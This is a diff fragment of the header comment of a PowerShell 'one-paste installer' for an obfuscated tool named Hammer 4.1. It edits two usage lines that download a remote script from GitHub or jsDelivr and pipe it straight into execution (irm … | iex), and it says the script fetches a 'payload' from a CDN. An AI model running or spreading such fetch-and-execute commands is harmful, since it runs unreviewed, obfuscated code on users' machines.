@@ -1,10 +1,10 @@
 <#
     Hammer 4.1 (obfuscated) - One-paste installer
     Usage (run in PowerShell) — same branch URL as 3.8 for backward compatibility:
-        irm https://raw.githubusercontent.com/dvahana2424-web/hammerdeckydowngrade/Hammer-3.8-obfuscated/install.ps1 | iex
+        irm 'https://raw.githubusercontent.com/dvahana2424-web/hammerdeckydowngrade/Hammer-3.8-obfuscated/install.ps1?rev=4.1.2' | iex
 
     jsDelivr alternate:
-        irm https://cdn.jsdelivr.net/gh/dvahana2424-web/hammerdeckydowngrade@Hammer-3.8-obfuscated/install.ps1 | iex
+        irm 'https://cdn.jsdelivr.net/gh/dvahana2424-web/hammerdeckydowngrade@Hammer-3.8-obfuscated/install.ps1?rev=4.1.2' | iex
 
     Downloads Hammer 4.1 payload from Cloudflare CDN (hammer-cdn worker),
     installs to C:\Program Files (x86)\Hammer, Desktop shortcut, and
